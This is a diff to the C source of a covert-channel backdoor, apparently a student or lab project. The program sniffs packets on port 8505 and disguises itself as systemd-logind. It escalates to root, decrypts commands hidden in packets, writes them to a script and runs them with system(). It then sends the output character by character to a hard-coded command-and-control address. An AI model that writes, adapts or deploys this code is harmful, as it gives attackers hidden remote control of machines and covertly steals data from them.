@@ -3,11 +3,15 @@
 #define FILTER "tcp and port 8505"
 #define PAYLOAD_KEY "8505"
 #define PORT "8505"
+#define SHPORT 8505
+#define SPORT 22
 #define BUFFERSIZE 1024
 #define MASK "/usr/lib/systemd/systemd-logind"
 #define CMD "./cmd.sh > results"
 #define CHMOD "chmod 755 cmd.sh"
 #define RESULT_FILE "results"
+#define INFECTEDIP "192.168.1.13"
+#define CNCIP "192.168.1.3"
 
 struct payload{
     char key[5]; // always 8505
@@ -33,10 +37,10 @@ int main(int argc, char **argv){
     setuid(0);
     setgid(0);
     char *c = "c";
-    char *sip = "142.232/153.106";
-    char *dip = "192.168.1.13";
-    unsigned short sport = 22;
-    unsigned short dport = 8505;
+    char *sip = INFECTEDIP;
+    char *dip = CNCIP;
+    unsigned short sport = SPORT;
+    unsigned short dport = SHPORT;
     unsigned char data[BUFSIZE] = "ls";
 
     if(strcmp(argv[1],c) == 0){
@@ -182,10 +186,6 @@ void ParsePayload(const u_char *payload, int len){
     FILE *fp;
     unsigned char decryptedtext[BUFSIZE+16];
     int decryptedlen, cipherlen;
-    char *args[1];
-    char *newenvion[] = { NULL };
-    char *newargs[] = { NULL, "HELLO", "WORLD", NULL};
-    args[0] = CMD;
 
     if((fp = fopen("cmd.sh", "wb+")) < 0){
         perror("fopen");
@@ -203,19 +203,13 @@ void ParsePayload(const u_char *payload, int len){
         exit(1);
     }
     fclose(fp);
-    //execve(CHMOD, newargs, newenvion);
-    //execve(CMD, newargs,newenvion);
     system(CHMOD);
     system(CMD);
-    if((fp = fopen("results", "rb+")) < 0){
-        perror("fopen");
-        exit(1);
-    }
 
-    char *srcip = "142.232.153.106";
-    char *destip = "192.168.1.3";
-    unsigned short sport = 8505;
-    unsigned short dport = 8505;
+    char *srcip = INFECTEDIP;
+    char *destip = CNCIP;
+    unsigned short sport = SHPORT;
+    unsigned short dport = SHPORT;
 
     send_results(srcip, destip, sport, dport, RESULT_FILE);
 }
@@ -258,6 +252,7 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
     }
 
     while((input = fgetc(file)) != EOF) {
+        printf("Character to send: %d\n", input);
         covert_send(sip, dip, sport, dport, (unsigned char *) &input, 1); //send the packet
         start = clock();    //start of clock
         timer_complete = 0;    //reset the timer again
@@ -273,6 +268,7 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
             }
         }
     }
+    fclose(file);
 }
 
 
